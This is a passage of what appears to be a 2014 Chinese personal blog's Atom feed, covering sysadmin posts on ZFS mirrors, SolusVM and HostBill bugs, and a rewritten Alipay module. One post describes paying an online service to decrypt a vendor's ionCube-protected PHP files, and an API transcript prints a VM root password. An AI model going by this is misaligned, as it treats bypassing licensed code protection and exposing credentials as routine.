<td><a href="http://img.juhe.cn/sdkdocs/JUHE_iOS_SMSSDK_V1.0.1.zip" target="_blank" rel="external">官方下载</a> <a href="https://mega.co.nz/#!IAFjiY5C!og8duR22uGxcr8-x45_RP-KSfjUjMJ-96SMEfwHBcHg" target="_blank" rel="external">MEGA</a></td>
</tr>
<tr>
<td>条码数据 SDK</td>
<td>1.0.2</td>
<td>2014-09-23</td>
<td>是</td>
<td><a href="http://img.juhe.cn/sdk/Barcode_iOSSDK_v1.2.zip" target="_blank" rel="external">官方下载</a> <a href="https://mega.co.nz/#!hNkhUJhB!g9_8MmGXPfstaEvtzLIjFPnUTh_nNTUfZnWtqJQw_FA" target="_blank" rel="external">MEGA</a></td>
</tr>
<tr>
<td>比价数据 SDK</td>
<td>1.0.0</td>
<td>2014-03-10</td>
<td>否</td>
<td><a href="http://ds.juhe.cn/data/sdk/ios/bijia.sdk.v1.0.zip" target="_blank" rel="external">官方下载</a> <a href="https://mega.co.nz/#!ZQk1WBpZ!aFqEbArQPO_6WnIw9VQoAo99hb_OeOX4InJw_RfO69w" target="_blank" rel="external">MEGA</a></td>
</tr>
<tr>
<td>电商数据 SDK</td>
<td>1.0.0</td>
<td>2014-03-10</td>
<td>否</td>
<td><a href="http://ds.juhe.cn/data/sdk/ios/dianshang.sdk.v1.0.zip" target="_blank" rel="external">官方下载</a> <a href="https://mega.co.nz/#!tFkRlL5D!XeHy3aayLF8hTORbYNJNM15kOUeuSc1XCSQLaxW3Zao" target="_blank" rel="external">MEGA</a></td>
</tr>
<tr>
<td>你查查</td>
<td>1.6.4</td>
<td>2014-10-09</td>
<td>是</td>
<td><a href="https://itunes.apple.com/cn/app/ni-cha-cha-tiao-ma-sao-miao/id789568401?l=en&amp;mt=8" target="_blank" rel="external">App Store</a></td>
</tr>
<tr>
<td>聚合基站</td>
<td>2.3.4</td>
<td>2014-10-17</td>
<td>是</td>
<td><a href="https://itunes.apple.com/cn/app/ju-he-ji-zhan-cha-xun/id596612170?l=en&amp;mt=8" target="_blank" rel="external">App Store</a></td>
</tr>
</tbody>
</table>
<p>另外，聚合数据首页上链接过去的 <a href="http://www.jikexueyuan.com/course/324.html" target="_blank" rel="external">聚合数据 iOS 项目开发实战：条码查询器</a> 内课程资料里的 Demo 亦包含会上传通讯录的代码。这里限于版权原因就不提供下载了。</p>
<h2 id="结尾">结尾</h2><p>最后，请聚合数据尽快删除存储在服务器上的用户隐私数据并公开承认且道歉。</p>
<p>以及，贵司不如帮员工报个新东方什么的英语培训班？如果新东方救不了的话，不如试试找老罗？代码里各种 typo 看的我都快吐了 :-(</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="起因">起因</h2><p>之前在测试聚合数据的 <a href="https://mega.co.nz/#!pE9iWLxD!bdAA9EA9R6finccP701kQPBjCdkqMtKT2-agKeMb0LA" target="_blank" rel="ex]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 ZFS 构建易管理的镜像服务器]]></title>
    <link href="https://blog.swan.im/build-manageable-mirror-using-zfs/"/>
    <id>https://blog.swan.im/build-manageable-mirror-using-zfs/</id>
    <published>2014-08-28T12:11:22.000Z</published>
    <updated>2014-08-28T12:11:53.000Z</updated>
    <content type="html"><![CDATA[<p>我们在某机房托管了很多服务器，更新和初次安装时经常会占用大量下行带宽（虽然下行是不收钱的），也拖慢了部署机器的速度，于是我在机房里搭建了一个镜像服务器。</p>
<p>一开始我使用的是 XFS 作为文件系统，在 rsync 列目录和 du 统计文件大小时经常挂住，系统 load 常常能到 60，在某天 … 硬盘终于挂了</p>
<p>于是经由朋友诱惑换到了 ZFS，再也无需担心 load 的问题了 … 抹泪啊真是</p>
<h2 id="那么，ZFS_有啥好的？">那么，ZFS 有啥好的？</h2><p>首先镜像服务不只是镜像一个发行版，由于历史遗留原因，我们同时在用的发行版有 Red Hat、CentOS、Debian、Ubuntu。</p>
<p>而各种发行版的同步方式并不都是 rsync，如果都是 rsync 的话，加个 <code>--report</code> 参数就能知道每次变更的大小了。那我之前是怎么做的呢？</p>
<p>先 <code>du -sh ./</code> 记录一遍，然后再 <code>du -sh ./</code> 记录一遍，算差值。<code>du</code> 扫目录的时候经常 load 会很高，主要都在等 IO 了。</p>
<p>而换到 ZFS 之后，每个镜像项目是一个单独的 volume，我只需要记录卷占用的变化就可以了，还用扫什么目录啊！</p>
<p>好话说完了那么：</p>
<h2 id="ZFS_有啥不好的呢">ZFS 有啥不好的呢</h2><p>ZFS 需要大量的系统资源，另外对 32 位系统的支持不是很好。<br>当然这都不算问题啦，内存也不贵多买几条就是了然后现在还有人在服务器上用 32 位系统嘛（</p>
<p>下面来讲讲怎么用 …</p>
<h2 id="安装_ZFS_on_Linux">安装 ZFS on Linux</h2><p>以下例子中系统环境为 <code>Debian GNU/Linux 7.6 (wheezy) x86_64</code> </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//archive.zfsonlinux.org/debian/pool/main/z/zfsonlinux/zfsonlinux_2%7Ewheezy_all.deb</span></span><br><span class="line">sudo dpkg -<span class="tag">i</span> zfsonlinux_2~wheezy_all<span class="class">.deb</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install debian-zfs</span><br></pre></td></tr></table></figure>
<p>需要注意的是安装时会编译内核模块，会比较慢，耐心等待就好。</p>
<h2 id="创建存储池">创建存储池</h2><p>官方文档里推荐是使用 <code>/dev/disk/by-id/</code> 里的名称来创建存储池，用 <code>/dev/sd*</code> 可能偶尔会导致一些导入错误。</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zpool create -o ashift=12 mpool /dev/disk/by-id/scsi-<span class="number">14d534654202</span><span class="number">020207a348</span>b11c863ea<span class="number">4a9099563</span>cb847fbcf</span><br></pre></td></tr></table></figure>
<p>创建完成后可以用 <code>zpool list</code> 命令来检查是否已经成功创建：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">NAME</span>    <span class="tag">SIZE</span>  <span class="tag">ALLOC</span>   <span class="tag">FREE</span>    <span class="tag">CAP</span>  <span class="tag">DEDUP</span>  <span class="tag">HEALTH</span>  <span class="tag">ALTROOT</span></span><br><span class="line"><span class="tag">mpool</span>  1<span class="class">.81T</span>  1<span class="class">.72T</span>  95<span class="class">.7G</span>    94%  1<span class="class">.00x</span>  <span class="tag">ONLINE</span>  <span class="tag">-</span></span><br></pre></td></tr></table></figure>
<h2 id="管理镜像项目">管理镜像项目</h2><p>首先为这个镜像创建一个 volume：</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zfs <span class="built_in">create</span> mpool/puppetlabs-apt</span><br></pre></td></tr></table></figure>
<p>然后进行初次同步</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">cd</span> <span class="comment">/mpool/puppetlabs</span><span class="literal">-</span><span class="comment">apt</span></span><br><span class="line"><span class="comment">rsync</span> <span class="literal">-</span><span class="comment">aHvh</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">delete</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">delete</span><span class="literal">-</span><span class="comment">delay</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">no</span><span class="literal">-</span><span class="comment">owner</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">no</span><span class="literal">-</span><span class="comment">group</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">stats</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">safe</span><span class="literal">-</span><span class="comment">links</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">timeout=120</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">contimeout=120</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">delay</span><span class="literal">-</span><span class="comment">updates</span> <span class="literal">-</span><span class="comment">4</span> <span class="comment">rsync://apt</span><span class="string">.</span><span class="comment">puppetlabs</span><span class="string">.</span><span class="comment">com/packages/apt/</span> <span class="comment">/data/mirror/storage/puppet</span><span class="literal">-</span><span class="comment">deb</span></span><br></pre></td></tr></table></figure>
<p>这就完了？当然没有。</p>
<p>是不是在 <code>apt-get update</code> 的时候遇到过以下的提示？</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">W</span>: <span class="string">Failed to fetch http://mirrors.agslb.com/puppetlabs-apt/dists/trusty/main/source/Sources  404  Not Found</span></span><br><span class="line"></span><br><span class="line"><span class="http"><span class="attribute">W</span>: <span class="string">Failed to fetch http://mirrors.agslb.com/puppetlabs-apt/dists/trusty/dependencies/source/Sources  404  Not Found</span></span><br><span class="line"></span><br><span class="line"><span class="http"><span class="attribute">W</span>: <span class="string">Failed to fetch http://mirrors.agslb.com/puppetlabs-apt/dists/trusty/main/binary-amd64/Packages  404  Not Found</span></span><br><span class="line"></span><br><span class="line"><span class="http"><span class="attribute">W</span>: <span class="string">Failed to fetch http://mirrors.agslb.com/puppetlabs-apt/dists/trusty/dependencies/binary-amd64/Packages  404  Not Found</span></span><br><span class="line"></span><br><span class="line"><span class="http"><span class="attribute">W</span>: <span class="string">Failed to fetch http://mirrors.agslb.com/puppetlabs-apt/dists/trusty/main/binary-i386/Packages  404  Not Found</span></span><br><span class="line"></span><br><span class="line"><span class="groovy"><span class="string">W:</span> Failed to fetch <span class="string">http:</span><span class="comment">//mirrors.agslb.com/puppetlabs-apt/dists/trusty/dependencies/binary-i386/Packages  404  Not Found</span></span></span></span></span></span></span><br></pre></td></tr></table></figure>
<p>嗯，有了 ZFS，这种现象就不会有啦~</p>
<p>在增量同步前先对当前本地镜像做一次 snapshot：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zfs <span class="keyword">snapshot</span> mpool/puppetlabs-apt<span class="variable">@20140829</span></span><br></pre></td></tr></table></figure>
<p>然后挂载到一个新目录，再将 nginx 里的路径指向这个新目录：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t zfs mpool<span class="regexp">/puppetlabs-apt@20140829 /</span>var<span class="regexp">/www/mi</span>rror<span class="regexp">/puppetlabs-apt/</span><span class="number">20140829</span></span><br></pre></td></tr></table></figure></p>
<p>同步完成后，再将 nginx 里的路径指向原来的目录即可。是不是很方便呐~</p>
<p>— EOF —</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>我们在某机房托管了很多服务器，更新和初次安装时经常会占用大量下行带宽（虽然下行是不收钱的），也拖慢了部署机器的速度，于是我在机房里搭建了一个镜像服务器。</p>
<p>一开始我使用的是 XFS 作为文件系统，在 rsync 列目录和 du 统计文件大小时经常挂住，系统 lo]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[修复 SolusVM 添加 IP 之后无法使用的 Bug]]></title>
    <link href="https://blog.swan.im/fuck-solusvm-again/"/>
    <id>https://blog.swan.im/fuck-solusvm-again/</id>
    <published>2014-06-30T22:21:53.000Z</published>
    <updated>2014-06-30T22:27:19.000Z</updated>
    <content type="html"><![CDATA[<p>问题重现步骤：</p>
<ol>
<li>在 SolusVM 里给 VPS 添加一个新 IP；</li>
<li>在 VPS 里加上这个 IP：<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@da2 ~]<span class="comment"># vi /etc/sysconfig/network-scripts/ifcfg-eth0:0</span></span><br><span class="line"><span class="constant">DEVICE</span>=eth0:0</span><br><span class="line"><span class="constant">BOOTPROTO</span>=static</span><br><span class="line"><span class="constant">ONPARENT</span>=yes</span><br><span class="line"><span class="constant">IPADDR</span>=xxx.xx.xxx.5</span><br><span class="line"><span class="constant">GATEWAY</span>=xxx.xx.xxx.1</span><br><span class="line"><span class="constant">NETMASK</span>=255.255.255.0</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>执行 <code>ifup eth0:0</code>；</p>
<ol>
<li>VPS 内可以接收到新 IP 的包，但是包 发不出去：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01<span class="pseudo">:55</span><span class="pseudo">:22</span><span class="class">.958310</span> <span class="tag">IP</span> 218<span class="class">.xx</span><span class="class">.xxx</span><span class="class">.5</span> &gt; 123<span class="class">.xx</span><span class="class">.xxx</span><span class="class">.82</span>: <span class="tag">ICMP</span> <span class="tag">echo</span> <span class="tag">reply</span>, <span class="tag">id</span> 46410, <span class="tag">seq</span> 163, <span class="tag">length</span> 64</span><br><span class="line">01<span class="pseudo">:55</span><span class="pseudo">:23</span><span class="class">.959400</span> <span class="tag">IP</span> 123<span class="class">.xx</span><span class="class">.xxx</span><span class="class">.82</span> &gt; 218<span class="class">.xx</span><span class="class">.xxx</span><span class="class">.5</span>: <span class="tag">ICMP</span> <span class="tag">echo</span> <span class="tag">request</span>, <span class="tag">id</span> 46410, <span class="tag">seq</span> 164, <span class="tag">length</span> 64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>在其他机器上执行 <code>arp -an</code> 显示为 [incomplete]。</p>
<p>嗯，其实找了半天根本不是 CentOS 的问题 …<br>是啥的呢，你猜对啦~ 又是 SolusVM！</p>
<p>SolusVM 使用了 ebtables 来过滤 IP 盗用的行为，但是新增 IP 并没有更新 ebtables 里的记录，所以这个新增 IP 自然是用不了了。</p>
<p>不过解决方法倒是很简单，重启主机上的 solusvm-ipsecure 服务即可：<code>service solusvm-ipsecure restart</code></p>
<p>最后，SolusVM 你去死去死去死！去年就上报了的 Bug 为什么还不修！</p>
<p><img src="/content/images/2014/Jul/09.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>问题重现步骤：</p>
<ol>
<li>在 SolusVM 里给 VPS 添加一个新 IP；</li>
<li>在 VPS 里加上这个 IP：<figure class="highlight makefile"><table><tr><td class="gutter">]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[DirectAdmin 镜像]]></title>
    <link href="https://blog.swan.im/directadmin-mirror/"/>
    <id>https://blog.swan.im/directadmin-mirror/</id>
    <published>2014-06-15T19:02:39.000Z</published>
    <updated>2014-06-15T19:03:13.000Z</updated>
    <content type="html"><![CDATA[<p>由于最近在帮朋友 IDC 打理一些事情的时候，发现安装 DirectAdmin 太慢了，所以联系了下 DirectAdmin 官方做了这个镜像。</p>
<p>与其他镜像不同的是，窝同时提供了 IPv4 和 IPv6 啊哈哈哈还有 Rsync。</p>
<p>地址是：<a href="http://files19.directadmin.com/" target="_blank" rel="external">http://files19.directadmin.com/</a></p>
<p>更新时间是 UTC 每天的 0:00，就是北京时间的早上 8 点。请尽量避免在这个时间内更新。</p>
<p>另外因为备案的问题，这个镜像放在了 Linode 日本机房，至于速度的话，通过调整过的 <a href="http://www.tcpedge.com/" target="_blank" rel="external">TCPEdge</a> 加速的镜像下载速度也很快，百兆的话一般都能跑满带宽。</p>
<p>啊，对了，如果需要自己做镜像的又懒得联系官方的话，直接用以下命令同步即可：</p>
<figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/usr/bin/rsync</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">recursive</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">perms</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">links</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">delete</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">times</span> <span class="literal">-</span><span class="comment">W</span> <span class="comment">files19</span><span class="string">.</span><span class="comment">directadmin</span><span class="string">.</span><span class="comment">com::directadmin</span> <span class="comment">/var/www/html/services</span></span><br></pre></td></tr></table></figure>
<p>嗯，就是这样。喵。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>由于最近在帮朋友 IDC 打理一些事情的时候，发现安装 DirectAdmin 太慢了，所以联系了下 DirectAdmin 官方做了这个镜像。</p>
<p>与其他镜像不同的是，窝同时提供了 IPv4 和 IPv6 啊哈哈哈还有 Rsync。</p>
<p>地址是：<a ]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[HostBill + SolusVM = Disaster]]></title>
    <link href="https://blog.swan.im/hostbill-solusvm-disaster/"/>
    <id>https://blog.swan.im/hostbill-solusvm-disaster/</id>
    <published>2014-06-10T10:52:16.000Z</published>
    <updated>2014-06-10T10:52:37.000Z</updated>
    <content type="html"><![CDATA[<p>想吐槽这两货已经很久了，自从我去年很脑残的从 WHMCS、HostBill 里选了 HostBill 之后 …</p>
<p>嗯，噩梦就开始了。</p>
<p>首先是支付宝插件整合的问题，HostBill 官方的支付宝插件不能用。</p>
<p>为什么呢？日志里没提呀，嗯那我逆向工程看看吧 …于是我逆向工程发现了一个 Typo 然后感觉整体代码都写的太烂了于是重写了一个。</p>
<p>好的接下来我们需要把 SolusVM 整合进去，(⊙o⊙)… 听起来很简单是吧？</p>
<p>你错了，HostBill 的面向 Bug 编程真是深得我的真传，SolusVM Rebuild 的话会把 HostBill 数据库里的 Root 密码设置为 SolusVM 的登录密码。然后作为一个逆向工程爱好者我又一次看了它的源码，嗯 … 对不起我没找到在哪儿改的。</p>
<p>那，我去 SolusVM 看看文档自己发请求看看是哪个傻逼了吧。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">aveline<span class="annotation">@web</span>-<span class="string">a:</span>~$ curl --insecure -i --data <span class="string">"id=$SOLUSVM_ACCESS_ID&amp;key=$SOLUSVM_ACCESS_KEY&amp;action=vserver-rebuild&amp;template=linux-debian-7.3.0-x86-min-gen2-v1&amp;vserverid=7&amp;async=false&amp;rdtype=json"</span> <span class="string">https:</span><span class="comment">//master.solusvm.internal:5656/api/admin/command.php &amp;&amp; echo</span></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Content-<span class="string">type:</span> text/html</span><br><span class="line">Transfer-<span class="string">Encoding:</span> chunked</span><br><span class="line"><span class="string">Date:</span> Tue, <span class="number">10</span> Jun <span class="number">2014</span> <span class="number">18</span>:<span class="number">26</span>:<span class="number">27</span> GMT</span><br><span class="line"><span class="string">Server:</span> SolusVM</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"status"</span>:<span class="string">"success"</span>,<span class="string">"statusmsg"</span>:<span class="string">"Virtual server is being rebuilt"</span>,<span class="string">"rootpassword"</span>:<span class="string">"5iuan90U"</span>,<span class="string">"information"</span>:<span class="string">""</span>&#125;</span><br></pre></td></tr></table></figure>
<p>然后等 VM 重装完了用这个密码登录上去果然可以，诶等等等等，登录上去之后，为毛还是 Ubuntu？！</p>
<p>看日志也别想了，没有的。有的也都显示是 <strong>Success</strong> 或者 <strong>Complete</strong>，和没有一样的。</p>
<p>看源码也别想了，这货代码不好好写，代码混淆倒是做的挺好，估计是写太烂不想给人看吧。</p>
<p>嗯，吐槽完毕。准备自己写 Billing Portal + 换 OpenStack（</p>
<p>好啦还是去写个 workaround 吧。叹气。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>想吐槽这两货已经很久了，自从我去年很脑残的从 WHMCS、HostBill 里选了 HostBill 之后 …</p>
<p>嗯，噩梦就开始了。</p>
<p>首先是支付宝插件整合的问题，HostBill 官方的支付宝插件不能用。</p>
<p>为什么呢？日志里没提呀，嗯那]]>
    </summary>
    
  </entry>
  
  <entry>
    <title><![CDATA[HostBill 支付宝模块更新]]></title>
    <link href="https://blog.swan.im/hostbill-alipay-14/"/>
    <id>https://blog.swan.im/hostbill-alipay-14/</id>
    <published>2014-06-08T00:40:43.000Z</published>
    <updated>2014-06-08T00:41:25.000Z</updated>
    <content type="html"><![CDATA[<p>这次更新的主要内容有：</p>
<ul>
<li>不再使用和原有模块相同的文件名，避免被覆盖</li>
<li>增加命名空间选项，防止共用商户时出现订单号重复导致无法支付的情况</li>
</ul>
<p><a href="https://github.com/ym/alipay-hostbill/archive/1.4.zip" target="_blank" rel="external">戳这里下载</a></p>
<p>下载后解压到 HostBill 安装目录的 <strong>includes/modules/Payment</strong> 文件夹下，记得把 <strong>alipay-hostbill-1.4</strong> 重命名成 <strong>alipay2</strong>。</p>
<p>另外由于模块名称变了，安装之后需要重新激活，新的模块名称是 <strong>Alipay2</strong>。</p>
<p>呃如果觉得我描述的还有问题的话，复制以下命令执行就好啦：</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="regexp">/var/</span>www/hostbill # 请替换成自己的 HostBill 安装目录</span><br><span class="line">cd includes<span class="regexp">/modules/</span>Payment</span><br><span class="line">wget <span class="string">https:</span><span class="comment">//github.com/ym/alipay-hostbill/archive/1.4.tar.gz</span></span><br><span class="line">tar zxvf <span class="number">1.4</span>.tar.gz</span><br><span class="line">mv alipay-hostbill-<span class="number">1.4</span> alipay2</span><br></pre></td></tr></table></figure>
<p><img src="/content/images/2014/Jun/QQ20140608-1.png" alt=""></p>
<p>好像有同学不知道这里怎么填 … 嗯解释一下吧：</p>
<p>服务类型这里：</p>
<ul>
<li>create_direct_pay_by_user 是即时到账交易接口</li>
<li>trade_create_by_buyer 是双接口</li>
<li>create_partner_trade_by_buyer 纯担保交易接口</li>
</ul>
<p>然后代理商 ID 空着就行了。</p>
<p>如果有多个 HostBill 共用同一个支付宝账号的话，命名空间这里需要写一下名字，另外这里写了之后最好就不要再修改了，修改的话会导致用户还没支付的订单无法正确验证。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这次更新的主要内容有：</p>
<ul>
<li>不再使用和原有模块相同的文件名，避免被覆盖</li>
<li>增加命名空间选项，防止共用商户时出现订单号重复导致无法支付的情况</li>
</ul>
<p><a href="https://github.com/ym/ali]]>
    </summary>
    
      <category term="- HostBill
- 支付宝" scheme="https://blog.swan.im/tags/HostBill-%E6%94%AF%E4%BB%98%E5%AE%9D/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[HostBill 支付宝模块]]></title>
    <link href="https://blog.swan.im/hostbill-alipay-module/"/>
    <id>https://blog.swan.im/hostbill-alipay-module/</id>
    <published>2014-04-07T01:19:00.000Z</published>
    <updated>2014-06-08T00:44:25.000Z</updated>
    <content type="html"><![CDATA[<p>最近一阵子在搭建某 IDC 的客户与支持系统，由于 WHMCS 烂泥扶不上墙，所以我就选用了高大上的 HostBill。<br>（几乎免费的和一次性要付 999 刀的东西能比嘛</p>
<p>啊，当然呢，HostBill 也有很多不好的地方吖，比如这个自带的支付宝模块，就死活用不了，支付是没问题，但是回调啊总是 Failure。</p>
<p>找客服呢自然是没用的，为什么呢？我买了已经超过 30 天了，人家要额外收钱了而且还不一定能解决。</p>
<p>那只能自己来咯，首先付掉 2.50 EUR 在 <a href="http://easytoyou.eu" target="_blank" rel="external">http://easytoyou.eu</a> 买个一天的 ionCube Decoder。</p>
<p>然后解密以下文件：</p>
<ul>
<li>/includes/modules/Payment/class.alipay.php</li>
<li>/includes/modules/Payment/callback/alipay_return.php</li>
<li>/includes/modules/Payment/callback/alipay_callback.php</li>
</ul>
<p>解密之后我发现调用模块居然是这样做的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'cmd'</span>] = <span class="string">'callback'</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'module'</span>] = <span class="string">'alipay'</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'ali_type_r'</span>] = <span class="string">'callbak'</span>;</span><br><span class="line">error_reporting( <span class="number">0</span> );</span><br><span class="line">session_name( <span class="string">'SESSID'</span> . substr( md5( <span class="variable">$_SERVER</span>[<span class="string">'SERVER_NAME'</span>] ), -<span class="number">4</span> ) );</span><br><span class="line">session_start(  );</span><br><span class="line"><span class="keyword">include</span>( <span class="string">'../../../../hbf/bootstrap.php'</span> );</span><br><span class="line">FrontController::init( <span class="string">'module'</span> );</span><br></pre></td></tr></table></figure></p>
<p><strong>你！能！想！象！调！用！模！块！居！然！用！$_GET！来！传！参！数！吗！</strong><br><strong>反！正！我！不！能！</strong></p>
<p>好吧其实出错的原因呢和这儿关系不是很大，当然这么写肯定是不守<del>妇道</del>的！</p>
<p>这里用的是 <code>$_GET[&#39;ali_type_r&#39;]</code>，但是在 <strong>class.alipay.php</strong> 里面却检查的是 <code>$_REQUEST[&#39;ali_type_r&#39;]</code>，尼这是自己山寨的 <code>$_GET</code> 内容当然不会出现在 <code>$_REQUEST</code> 里啦！baka！</p>
<p>然后这里特么的你写的是 <code>callbak</code> 啊！睁大眼睛看看是不是少了一个 <code>c</code>！</p>
<p>另外就是支付宝 return 的验证接口需要把 <code>$_GET</code> 里的所有内容做一个 chksum，然后，嗯，我想是个人都能想清楚了：<br><code>$_GET[&#39;cmd&#39;]</code>、<code>$_GET[&#39;module&#39;]</code> 和 <code>$_GET[&#39;ali_type_r&#39;]</code> 混进来之后 chksum 肯定会不一样的啦~</p>
<p>既然问题都知道了，那么就好解决了。</p>
<p>不过呢，作为蛋疼党，窝比较喜欢重写而不是修 Bug … 加起来连 500 行都不到嘛！（撸袖子</p>
<p>以及自带的模块用的还是老版本的支付宝接口，窝参考支付宝官方的 PHP 栗子更新了下。</p>
<p>嗯，以下是窝重写之后的代码，已经扔在 GitHub 上了喵~<br><a href="https://github.com/ym/alipay-hostbill" target="_blank" rel="external">https://github.com/ym/alipay-hostbill</a></p>
<p>下载之后扔在 <strong>includes/modules/Payment</strong> 目录覆盖原有文件即可。<br>我在 PHP 5.5 下测试过是木有问题的，其他版本有问题可能性也不大，因为这次比较收敛，没有怎么用新特性。<br>如果有问题的话，欢迎在 <a href="https://github.com/ym/alipay-hostbill/issues" target="_blank" rel="external">GitHub</a> 上给我发 Bug 报告或者 Pull Request~</p>
<p>啊最后感谢师姑陪我写代码还送我蛋糕次以及顺便吐槽下支付宝你的 PHP 栗子是临时工写的吗，<code>veryfy</code>、<code>isSgin</code> 这些是个什么玩意儿啊？！<br>再顺便吐槽下 <a href="https://plus.google.com/110748073762130717665/about" target="_blank" rel="external">1901 咖啡馆</a> 你家为什么没有一个能让我吃 / 喝的下去的玩意儿以及为何 Wi-Fi 如此之烂以至于我在四月份的第一天就用掉了 900 M 的 3G 流量，太讨厌了！！！<br>发这篇文章到 Twitter 的时候我又发现了一个槽点啊哈哈，Logdown 的 slug 生成居然把 <strong>支付宝</strong> 给翻译成了 <strong>PayPal</strong>，给跪了！</p>
<p>哦，对了，刚才的蛋糕忘记上图了：</p>
<p><img src="http://user-image.logdown.io/user/950/blog/939/post/192835/VMDO0MOuQMen3dMlhoAD_IMG_1006.JPG" alt="IMG_1006.JPG"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>最近一阵子在搭建某 IDC 的客户与支持系统，由于 WHMCS 烂泥扶不上墙，所以我就选用了高大上的 HostBill。<br>（几乎免费的和一次性要付 999 刀的东西能比嘛</p>
<p>啊，当然呢，HostBill 也有很多不好的地方吖，比如这个自带的支付宝模块，就死]]>
    </summary>
    
      <category term="- HostBill
- 支付宝" scheme="https://blog.swan.im/tags/HostBill-%E6%94%AF%E4%BB%98%E5%AE%9D/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[去除讨厌的手机淘宝启动图]]></title>
    <link href="https://blog.swan.im/remove-annoying-taobao-bootimg/"/>
    <id>https://blog.swan.im/remove-annoying-taobao-bootimg/</id>
    <published>2014-03-06T08:35:00.000Z</published>
    <updated>2014-06-06T18:01:58.000Z</updated>
    <content type="html"><![CDATA[<p>最近手机淘宝多了一个很讨厌的启动图，上面是一个笑的很脑残的人拿着手机的样子，每次早上在被窝里查快递的时候，我都会被丫的脑残笑恶寒的立刻就醒了。（你们看我最近起的这么早不是没有原因的！</p>
<p>然后今天我终于忍不住了。</p>
